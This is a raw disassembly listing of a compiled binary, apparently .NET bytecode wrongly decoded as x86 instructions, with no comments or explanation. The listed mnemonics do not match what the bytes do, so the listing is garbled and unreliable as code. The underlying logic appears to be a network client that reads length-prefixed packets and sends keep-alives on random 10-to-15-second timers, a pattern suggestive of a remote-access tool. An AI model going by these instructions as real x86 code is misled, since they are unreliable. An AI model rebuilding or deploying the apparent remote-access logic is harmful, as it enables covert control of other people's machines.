  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 4e 21 00       	and    $0x214e72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 5c                	jb     0x4030d6
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 66 21 00       	and    $0x216672,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
